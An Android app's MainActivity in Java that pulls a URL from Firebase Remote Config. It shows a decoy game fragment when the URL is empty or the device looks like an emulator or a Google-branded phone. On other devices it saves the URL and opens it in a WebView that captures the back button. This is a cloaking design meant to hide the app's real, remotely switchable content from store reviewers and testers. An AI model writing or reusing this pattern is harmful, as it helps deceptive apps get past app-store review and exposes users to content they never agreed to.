package com.test123.myapplication;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.FragmentContainerView;
import androidx.fragment.app.FragmentManager;

import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.BuildConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.test123.myapplication.fragments.Game;
import com.test123.myapplication.fragments.Internet;
import com.test123.myapplication.fragments.Webview;

import java.io.IOException;
import java.net.InetAddress;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {
    private SharedPreferences preferences;
    private FragmentContainerView fragmentContainerView;
    private FragmentManager fragmentManager;
    private FirebaseRemoteConfig firebaseRemoteConfig;
    private String url = "";
    private static Boolean webViewActive = false;
    private String TAG = getClass().getCanonicalName();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        fragmentContainerView = findViewById(R.id.fragmentView);

        preferences = getPreferences(MODE_PRIVATE);

        fragmentManager = getSupportFragmentManager();
        if(isSavedUrl()){
            try {
                if(!isInternetAvailable())
                    fragmentManager.beginTransaction().add(R.id.fragmentView, new Internet()).commit();
                else{
                    Webview webview = new Webview();
                    Bundle args = new Bundle();
                    args.putString("url", url);
                    webview.setArguments(args);
                    fragmentManager.beginTransaction().add(R.id.fragmentView, webview).commit();
                }

            } catch (IOException e) {
                throw new RuntimeException(e);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }else{
            Log.i(TAG, "Url is null");
            try {
                firebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
                FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                        .setMinimumFetchIntervalInSeconds(3600)
                        .build();
                firebaseRemoteConfig.setConfigSettingsAsync(configSettings);
                firebaseRemoteConfig.fetchAndActivate().addOnCompleteListener(new OnCompleteListener<Boolean>() {
                    @Override
                    public void onComplete(@NonNull Task<Boolean> task) {
                        url = firebaseRemoteConfig.getString("url");
                        Log.i(TAG, "Is emu " + checkIsEmu());
                        if(url.isEmpty() || checkIsEmu()){
                            Log.i(TAG, "Url error or is emu");
                            fragmentManager.beginTransaction().add(R.id.fragmentView, new Game()).commit();
                        }else {
                            Log.i(TAG, "Url success and is not emu");
                            preferences.edit().putString("m_url", url).apply();
                            Webview webview = new Webview();
                            Bundle args = new Bundle();
                            args.putString("url", url);
                            webview.setArguments(args);
                            fragmentManager.beginTransaction().add(R.id.fragmentView, webview).commit();
                        }
                    }
                });
            }catch (Exception e){
                Log.e(TAG, e.getMessage());
            }

        }
    }

    private Boolean isSavedUrl(){
        url = preferences.getString("m_url", "");
        if(url!="")
            return true;
        else
            return false;
    }
    public boolean isInternetAvailable() throws IOException, InterruptedException {
            String command = "ping -c 1 google.com";
            return Runtime.getRuntime().exec(command).waitFor() == 0;
    }
    private boolean checkIsEmu() {
        if (BuildConfig.DEBUG) return false;
        String phoneModel = Build.MODEL;
        String buildProduct = Build.PRODUCT;
        String buildHardware = Build.HARDWARE;
        String brand = Build.BRAND;
        return (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.toLowerCase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware.equals("goldfish")
                || brand.contains("google")
                || buildHardware.equals("vbox86")
                || buildProduct.equals("sdk")
                || buildProduct.equals("google_sdk")
                || buildProduct.equals("sdk_x86")
                || buildProduct.equals("vbox86p")
                || Build.BOARD.toLowerCase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.toLowerCase(Locale.getDefault()).contains("nox")
                || buildHardware.toLowerCase(Locale.getDefault()).contains("nox")
                || buildProduct.toLowerCase(Locale.getDefault()).contains("nox"))
                || (brand.startsWith("generic") && Build.DEVICE.startsWith("generic"));
    }
    public static void webViewActive(){
        webViewActive = true;
    }
    @Override
    public void onBackPressed() {
        if(!webViewActive){
            super.onBackPressed();
        }else {
            Webview.backPressed();
        }
    }
}